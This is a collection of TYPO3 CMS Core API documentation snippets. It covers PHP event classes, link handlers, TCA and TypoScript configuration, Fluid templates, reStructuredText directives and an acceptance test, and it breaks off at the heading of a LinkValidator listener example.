https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/CustomLinkBrowser.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nprivate array $configuration = [];\nprivate ?PageRenderer $pageRenderer = null;\nprivate ?StandaloneView $view = null;\nprivate array $linkParts = [];\n\npublic function __construct(\n    protected UriBuilder $uriBuilder,\n    protected PageRenderer $pageRenderer\n) {\n}\n\npublic function initialize(\n    AbstractLinkBrowserController $linkBrowser,\n    $identifier,\n    array $configuration\n) {\n    $this->configuration = $configuration;\n}\n\npublic function setView(StandaloneView $view): void\n{\n    $this->view = $view;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Post Model Class in TYPO3 CMS\nDESCRIPTION: Defines a Post model class that extends AbstractEntity and implements the Stringable interface. Contains two protected properties for storing author information - a primary author and a secondary author, both of type Person that can be null.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/RelationshipNonM.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Post extends AbstractEntity implements \\Stringable\n{\n    /**\n     * @var Person\n     */\n    protected ?Person $author = null;\n\n    protected ?Person $secondAuthor = null;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Logging Table of Contents in reStructuredText\nDESCRIPTION: This snippet defines the table of contents for the TYPO3 logging documentation using reStructuredText directives. It includes links to various subsections of the logging system documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n\n    Quickstart/Index\n    Logger/Index\n    Configuration/Index\n    Model/Index\n    Writers/Index\n    Processors/Index\n```\n\n----------------------------------------\n\nTITLE: Adding Multiple Cache Tags with Different Lifetimes in TYPO3 CMS (PHP)\nDESCRIPTION: This snippet shows how to add multiple cache tags with different lifetimes to the frontend cache collector. The first tag expires after 1 hour (3600 seconds) and the second after 30 days (2592000 seconds).\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheCollector.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Cache\\CacheTag;\n\n$cacheDataCollector = $request->getAttribute('frontend.cache.collector');\n$cacheDataCollector->addCacheTags(\n    new CacheTag('tx_myextension_mytable_123', 3600),\n    new CacheTag('tx_myextension_mytable_456', 2592000),\n);\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFolderAddedEvent Class in TYPO3 CMS Core Resource\nDESCRIPTION: This snippet defines the AfterFolderAddedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class provides a getFolder() method that returns a Folder object, allowing event listeners to access the newly added folder for customizing permissions or setting up editor permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFolderAddedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFolderAddedEvent\n{\n    /**\n     * Returns the newly added folder\n     * \n     * @return \\TYPO3\\CMS\\Core\\Resource\\Folder\n     */\n    public function getFolder()\n    {\n        // Implementation details not shown in documentation\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyResultAfterFetchingObjectDataEvent Class in TYPO3 Extbase Persistence\nDESCRIPTION: This code defines the ModifyResultAfterFetchingObjectDataEvent class in the TYPO3\\CMS\\Extbase\\Event\\Persistence namespace. This event is fired after the storage backend has retrieved results from a query and allows for modification of the results before they are returned.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/ModifyResultAfterFetchingObjectDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Extbase\\Event\\Persistence;\n\nclass ModifyResultAfterFetchingObjectDataEvent\n{\n    public function getQuery()\n    {\n        // Returns the query object\n        // :returns: \\TYPO3\\CMS\\Extbase\\Persistence\\QueryInterface\n    }\n\n    public function getResult()\n    {\n        // Returns the result array\n        // :returns: array\n    }\n\n    public function setResult(array $result)\n    {\n        // Sets a modified result\n        // :param $result: the result\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing JavaScript for a custom LinkHandler in TYPO3\nDESCRIPTION: JavaScript module that handles the UI interaction for the GitHub LinkHandler. It defines methods for handling click events, form submission, and inserting links into the editor.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/CustomLinkHandlers.rst#2025-04-16_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n/**\n * Module: @t3docs/examples/github-link-handler\n */\ndefine(['TYPO3/CMS/Recordlist/LinkBrowser'], function(LinkBrowser) {\n  'use strict';\n\n  /**\n   * GitHub handler for the TYPO3 link browser\n   */\n  class GitHubLinkHandler {\n\n    /**\n     * Defines the repository number directly, and the link\n     *\n     * @param {Event} event\n     */\n    handleEvent(event) {\n      event.preventDefault();\n\n      const value = document.getElementById('gihublink_url').value.trim();\n      let url = null;\n      if (value.length > 0) {\n         url = 'github:' + value;\n      }\n\n      LinkBrowser.finalizeFunction(url);\n    }\n\n    /**\n     * Every handler has its own name\n     *\n     * @returns {string}\n     */\n    getModuleName() {\n      return 'github';\n    }\n  }\n\n  const githubLinkHandler = new GitHubLinkHandler();\n  LinkBrowser.registerListener('github', githubLinkHandler);\n  return githubLinkHandler;\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing CustomCategoryProcessor for TYPO3 CMS in PHP\nDESCRIPTION: This code defines a CustomCategoryProcessor class that implements the DataProcessorInterface. It processes comma-separated category lists, retrieves category objects, and adds them to the processed data for use in content elements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/DataProcessing/CustomCategoryProcessor.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\n/*\n * This file is part of the TYPO3 CMS project. [...]\n */\n\nnamespace T3docs\\Examples\\DataProcessing;\n\nuse T3docs\\Examples\\Domain\\Repository\\CategoryRepository;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer;\nuse TYPO3\\CMS\\Frontend\\ContentObject\\DataProcessorInterface;\n\n/**\n * Class for data processing comma separated categories\n */\nclass CustomCategoryProcessor implements DataProcessorInterface\n{\n    /**\n     * Process data for the content element \"My new content element\"\n     *\n     * @param ContentObjectRenderer $cObj The data of the content element or page\n     * @param array<string, mixed> $contentObjectConfiguration The configuration of Content Object\n     * @param array<string, mixed> $processorConfiguration The configuration of this processor\n     * @param array<string, mixed> $processedData Key/value store of processed data (e.g. to be passed to a Fluid View)\n     * @return array<mixed> the processed data as key/value store\n     */\n    public function process(\n        ContentObjectRenderer $cObj,\n        array $contentObjectConfiguration,\n        array $processorConfiguration,\n        array $processedData,\n    ) {\n        if (isset($processorConfiguration['if.']) && !$cObj->checkIf($processorConfiguration['if.'])) {\n            return $processedData;\n        }\n        // categories by comma separated list\n        $categoryIdList = $cObj->stdWrapValue('categoryList', $processorConfiguration);\n        $categories = [];\n        if ($categoryIdList) {\n            $categoryIdList = GeneralUtility::intExplode(',', (string)$categoryIdList, true);\n            /** @var CategoryRepository $categoryRepository */\n            $categoryRepository = GeneralUtility::makeInstance(CategoryRepository::class);\n            foreach ($categoryIdList as $categoryId) {\n                $categories[] = $categoryRepository->findByUid($categoryId);\n            }\n            // set the categories into a variable, default \"categories\"\n            $targetVariableName = $cObj->stdWrapValue('as', $processorConfiguration, 'categories');\n            $processedData[$targetVariableName] = $categories;\n        }\n        return $processedData;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Directory Structure in ReStructuredText\nDESCRIPTION: This code snippet shows the directory structure of a typical TYPO3 installation using ReStructuredText formatting. It illustrates the use of symlinks for managing TYPO3 Core versions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/ClassicInstallations.rst#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n*   typo3_src-12.0.0\n\n    *   typo3\n    *   vendor\n    *   index.php\n\n*   public\n\n    *   fileadmin\n    *   typo3 -> typo3_src/typo3\n    *   typo3_src -> ../typo3_src-12.0.0\n    *   typo3conf\n    *   typo3temp\n    *   vendor ->  typo3_src/vendor\n    *   index.php -> typo3_src/index.php\n```\n\n----------------------------------------\n\nTITLE: Declaring a Namespace in a Controller Class\nDESCRIPTION: Shows how to declare a namespace at the beginning of a PHP class file in the examples extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace Documentation\\Examples\\Controller;\n```\n\n----------------------------------------\n\nTITLE: Configuring Email Validators in TYPO3\nDESCRIPTION: Example of configuring multiple email validators in TYPO3 to verify email addresses, using both RFC validation and DNS check validation classes from the Egulias library.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['validators'] = [\n    \\Egulias\\EmailValidator\\Validation\\RFCValidation::class,\n    \\Egulias\\EmailValidator\\Validation\\DNSCheckValidation::class\n];\n```\n\n----------------------------------------\n\nTITLE: Setting Default Mail Reply-To Address\nDESCRIPTION: This snippet indicates the default reply-to email address for TYPO3 emails when no other reply address is specified, ensuring that responses are directed correctly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_23\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['defaultMailReplyToAddress']\n:type: text\n:Default: ''\n\nThis default email address is used when no other 'reply-to' address is set for a TYPO3-generated email.\n```\n\n----------------------------------------\n\nTITLE: Accessing NormalizedParams from PSR-7 Request\nDESCRIPTION: Shows how to retrieve the NormalizedParams instance from a PSR-7 ServerRequestInterface object as an attribute. This is the main way to access normalized server parameters in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/NormalizedParams.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$normalizedParams = $request->getAttribute('normalizedParams')\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileDeletedEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the AfterFileDeletedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The event is constructed with a File object and provides methods to retrieve the deleted file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileDeletedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AfterFileDeletedEvent\n{\n    public function __construct(\n        private readonly File $file\n    ) {\n    }\n\n    public function getFile(): File\n    {\n        return $this->file;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Category Field in TYPO3 TCA\nDESCRIPTION: Sets up a category field configuration in TYPO3's TCA with a one-to-one relationship. This configuration defines a mainCategory column that establishes a single category association for records in the specified table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Categoy/CategoryOneTo.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA'][$myTable]['columns']['mainCategory'] = [\n   'config' => [\n      'type' => 'category',\n      'relationship' => 'oneToOne'\n   ]\n];\n```\n\n----------------------------------------\n\nTITLE: Defining a Hidden Site Set in YAML\nDESCRIPTION: This snippet demonstrates how to create a hidden site set that is not visible in the backend or console commands.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-vendor/my-helperset\nlabel: A helper Set that is not visible inside the GUI\nhidden: true\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeFinalSearchQueryIsExecutedEvent Listener in TYPO3\nDESCRIPTION: Example event listener implementation that demonstrates how to manipulate the QueryBuilder instance before the final search query is executed. This code would be placed in a TYPO3 extension under the specified path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/IndexedSearch/BeforeFinalSearchQueryIsExecutedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\IndexedSearch\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Database\\Query\\QueryBuilder;\nuse TYPO3\\CMS\\IndexedSearch\\Event\\BeforeFinalSearchQueryIsExecutedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeFinalSearchQueryIsExecutedEvent $event): void\n    {\n        $queryBuilder = $event->getQueryBuilder();\n\n        // Modify the query builder object\n        // Note: The query builder API is not considered public API\n        // and might change between TYPO3 versions\n        $queryBuilder->andWhere(\n            $queryBuilder->expr()->eq('item_type', $queryBuilder->createNamedParameter('0'))\n        );\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extbase Short Notation Example\nDESCRIPTION: Example of using shortened translation keys in Extbase context\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<f:translate key=\"commentHeader\" />\n<!-- or as inline Fluid: -->\n{f:translate(key: 'commentHeader')}\n```\n\n----------------------------------------\n\nTITLE: Using EntityRemovedFromPersistenceEvent in PHP\nDESCRIPTION: API reference for the EntityRemovedFromPersistenceEvent PSR-14 event in TYPO3 CMS. This event is fired after an object has been sent to the persistence layer for removal and provides access to the entity being removed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Persistence/EntityRemovedFromPersistenceEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class EntityRemovedFromPersistenceEvent\n{\n    private object $entity;\n\n    public function __construct(object $entity)\n    {\n        $this->entity = $entity;\n    }\n\n    public function getEntity(): object\n    {\n        return $this->entity;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Identifier in BeforeFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the current data structure identifier, which is always null for listeners since event propagation stops when an identifier is set.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getIdentifier()\n    :returns: `?array`\n\n    Returns the current data structure identifier, which will always be\n    `null` for listeners, since the event propagation is\n    stopped as soon as a listener defines an identifier.\n```\n\n----------------------------------------\n\nTITLE: Implementing getCanonicalGenerationDisabledException Method in ModifyUrlForCanonicalTagEvent Class\nDESCRIPTION: This method retrieves the exception for disabled canonical generation, if any. It returns either null or an instance of TYPO3\\CMS\\Seo\\Exception\\CanonicalGenerationDisabledException.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Seo/ModifyUrlForCanonicalTagEvent.rst.txt#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getCanonicalGenerationDisabledException()\n        :returns: `?\\TYPO3\\CMS\\Seo\\Exception\\CanonicalGenerationDisabledException`\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Extension Configuration for Language Override\nDESCRIPTION: Extension configuration that sets up the path for country translation overrides\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Country/BeforeCountriesEvaluatedEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['locallangXMLOverride']['EXT:core/Resources/Private/Language/Iso/countries.xlf'][] =\n    'EXT:my_extension/Resources/Private/Language/countries.xlf';\n```\n\n----------------------------------------\n\nTITLE: Requiring a New Major Version of a TYPO3 Extension\nDESCRIPTION: Command to update a TYPO3 extension to a new major version. This example shows how to require version 3.0 or higher of an extension while respecting semantic versioning.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/VersionControl.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncomposer require someVendor/someExtension:^3.0\n```\n\n----------------------------------------\n\nTITLE: Defining ReStructuredText Index Entry for File Abstraction Layer Folders\nDESCRIPTION: This directive adds an index entry for 'File abstraction layer; Folders' in the documentation, improving searchability.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Folders.rst#2025-04-16_snippet_1\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  index:: File abstraction layer; Folders\n```\n\n----------------------------------------\n\nTITLE: Creating New Record Link with TYPO3 ViewHelpers in Fluid HTML Template\nDESCRIPTION: A Fluid template partial that creates a link to add a new haiku record in the TYPO3 backend. The code uses the be:uri.newRecord ViewHelper to generate the correct URL, and core:icon ViewHelper to display an icon. The link also includes translated text via the f:translate ViewHelper.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/_UriBuilder/_CreateHaikuBlankLink.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html data-namespace-typo3-fluid=\"true\"\n      xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\"\n      xmlns:core=\"http://typo3.org/ns/TYPO3/CMS/Core/ViewHelpers\"\n      xmlns:be=\"http://typo3.org/ns/TYPO3/CMS/Backend/ViewHelpers\"\n>\n   <a href=\"{be:uri.newRecord(pid:1, table:'tx_examples_haiku', returnUrl:returnUrl)}\">\n      <core:icon identifier=\"actions-document-new\"/>\n      <f:translate key=\"function_links_new_haiku\"/>\n   </a>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Configuring Text Rendering with Conditional Field Display\nDESCRIPTION: Defines a TypoScript object that renders text from a title field, with fallback to page level title if empty. Uses stdWrap for advanced text processing and conditional rendering.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/CodeBlock1.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier = TEXT\nmyIdentifier.stdWrap.field = title\nmyIdentifier.stdWrap.ifEmpty.data = leveltitle:0\n```\n\n----------------------------------------\n\nTITLE: RST Index and Reference Definitions\nDESCRIPTION: Defines index terms and reference anchor for database troubleshooting section\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/Database.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. index:: database, utf-8\n\n.. _troubleshooting_database:\n```\n\n----------------------------------------\n\nTITLE: RST Image Reference for TYPO3 Edit Links Interface\nDESCRIPTION: ReStructuredText code for displaying a screenshot of the TYPO3 edit links interface with a caption. The image shows a standard form for page editing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/EditLinks/EditLinksEditFull.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/EditLinks/EditLinksEditFull.png\n   :class: with-shadow\n\n   Page 1 ready for editing with the standard form\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for TYPO3 Backend Screenshot\nDESCRIPTION: ReStructuredText directive for embedding a screenshot showing the contextual menu functionality in TYPO3 backend modules with proper styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/BackendModules/BackendModulesContextualMenu.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/BackendModules/BackendModulesContextualMenu.png\n   :class: with-shadow\n\n   A typical contextual menu appears when clicking on a record icon\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Debug Exception Handler in TYPO3 CMS\nDESCRIPTION: This snippet shows how to register a custom debug exception handler in TYPO3 CMS. It sets the debugExceptionHandler in the system configuration to use the custom PostExceptionsOnTwitter class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Extending/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['debugExceptionHandler'] = \\Vendor\\SomeExtension\\Error\\PostExceptionsOnTwitter::class;\n```\n\n----------------------------------------\n\nTITLE: Configuring User Settings Showitem in TYPO3\nDESCRIPTION: Demonstrates the structure of the 'showitem' configuration for user settings, using tabs and localized language labels to organize form fields in the user setup module\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/UserSettingsConfiguration/Showitem.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'showitem' => '--div--;LLL:EXT:setup/Resources/Private/Language/locallang.xlf:personal_data,realName,email,emailMeAtLogin,avatar,lang,\n               --div--;LLL:EXT:setup/Resources/Private/Language/locallang.xlf:passwordHeader,passwordCurrent,password,password2,\n               --div--;LLL:EXT:setup/Resources/Private/Language/locallang.xlf:opening,startModule,\n               --div--;LLL:EXT:setup/Resources/Private/Language/locallang.xlf:editFunctionsTab,edit_RTE,resizeTextareas_MaxHeight,titleLen,edit_docModuleUpload,showHiddenFilesAndFolders,copyLevels,resetConfiguration'\n```\n\n----------------------------------------\n\nTITLE: Text Settings Configuration in YAML\nDESCRIPTION: Example configuration for a text type site setting, which is an alias for string type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: text\n    label: 'Foo'\n    default: 'bar'\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Styleguide Backend Module Acceptance Test\nDESCRIPTION: An acceptance test that verifies the styleguide module can be accessed through the TYPO3 backend interface and that its demo data generation functionality works correctly. Uses the BackendTester from CodeCeption.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_12\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types = 1);\nnamespace TYPO3\\CMS\\Styleguide\\Tests\\Acceptance\\Backend;\n\nuse TYPO3\\CMS\\Styleguide\\Tests\\Acceptance\\Support\\BackendTester;\nuse TYPO3\\TestingFramework\\Core\\Acceptance\\Helper\\Topbar;\n\n/**\n * Tests the styleguide backend module can be loaded\n */\nclass ModuleCest\n{\n    /**\n     * Selector for the module container in the topbar\n     *\n     * @var string\n     */\n    public static $topBarModuleSelector = '#typo3-cms-backend-backend-toolbaritems-helptoolbaritem';\n\n    /**\n     * @param BackendTester $I\n     */\n    public function _before(BackendTester $I)\n    {\n        $I->useExistingSession('admin');\n    }\n\n    /**\n     * @param BackendTester $I\n     */\n    public function styleguideInTopbarHelpCanBeCalled(BackendTester $I)\n    {\n        $I->click(Topbar::$dropdownToggleSelector, self::$topBarModuleSelector);\n        $I->canSee('Styleguide', self::$topBarModuleSelector);\n        $I->click('Styleguide', self::$topBarModuleSelector);\n        $I->switchToContentFrame();\n        $I->see('TYPO3 CMS Backend Styleguide', 'h1');\n    }\n\n    /**\n     * @depends styleguideInTopbarHelpCanBeCalled\n     * @param BackendTester $I\n     */\n    public function creatingDemoDataWorks(BackendTester $I)\n    {\n        $I->click(Topbar::$dropdownToggleSelector, self::$topBarModuleSelector);\n        $I->canSee('Styleguide', self::$topBarModuleSelector);\n        $I->click('Styleguide', self::$topBarModuleSelector);\n        $I->switchToContentFrame();\n        $I->see('TYPO3 CMS Backend Styleguide', 'h1');\n        $I->click('TCA / Records');\n        $I->waitForText('TCA test records');\n        $I->click('Create styleguide page tree with data');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic FormEngine Data Compilation in TYPO3\nDESCRIPTION: Shows the basic initialization and compilation of form data using FormDataCompiler and TcaDatabaseRecord group. Requires a PSR-7 request object and specific table/record information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/DataCompiling/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$formDataGroup = GeneralUtility::makeInstance(TcaDatabaseRecord::class);\n$formDataCompiler = GeneralUtility::makeInstance(FormDataCompiler::class);\n$formDataCompilerInput = [\n    'request' => $request, // the PSR-7 request object\n    'tableName' => $table,\n    'vanillaUid' => (int)$theUid,\n    'command' => $command,\n];\n$formData = $formDataCompiler->compile($formDataCompilerInput, $formDataGroup);\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Listener for AfterImageResourceResolvedEvent in TYPO3\nDESCRIPTION: Sample implementation of an event listener for the AfterImageResourceResolvedEvent. This listener demonstrates how to intercept the image resource resolution process and potentially modify the result before it's returned.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterImageResourceResolvedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\ContentObject\\Event\\AfterImageResourceResolvedEvent;\n\n/**\n * Event listener for the AfterImageResourceResolvedEvent\n */\nfinal class MyEventListener\n{\n    public function __invoke(AfterImageResourceResolvedEvent $event): void\n    {\n        $contentObjectRenderer = $event->getContentObjectRenderer();\n        $configuration = $event->getConfiguration();\n        $file = $event->getFile();\n        $imageResource = $event->getImageResource();\n\n        // ... custom code\n\n        // Manipulate the imageResource\n        // $event->setImageResource($modifiedImageResource);\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Checking Admin Status in TYPO3\nDESCRIPTION: Determines if the current backend user has administrator privileges.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->isAdmin();\n```\n\n----------------------------------------\n\nTITLE: Registering Hotkey with Alt Modifier on macOS in JavaScript\nDESCRIPTION: This snippet demonstrates how to register a hotkey using the Alt modifier on macOS. It shows the difference in key binding between macOS and other operating systems due to the Alt+e combination resulting in '€' on macOS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/HotkeyApi/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n[Hotkeys.normalizedCtrlModifierKey, ModifierKeys.ALT, 'e']\n```\n\nLANGUAGE: javascript\nCODE:\n```\n[Hotkeys.normalizedCtrlModifierKey, ModifierKeys.ALT, '€']\n```\n\n----------------------------------------\n\nTITLE: Pattern-Based Parameter Exclusion for cHash\nDESCRIPTION: Improved configuration using prefix pattern matching to exclude all parameters starting with a specific pattern. This simplifies configuration when dealing with multiple parameters from the same plugin or extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n'excludedParameters' => [\n    '^tx_my_plugin[data][',\n    // ...\n],\n```\n\n----------------------------------------\n\nTITLE: Implementing a LinkValidator Event Listener in TYPO3 CMS with PHP\nDESCRIPTION: This class implements functionality to check for external links that might be pointing to local pages on the same domain. It uses TYPO3's soft reference parsers to identify links in content fields and processes them for validation.\nSOURCE: 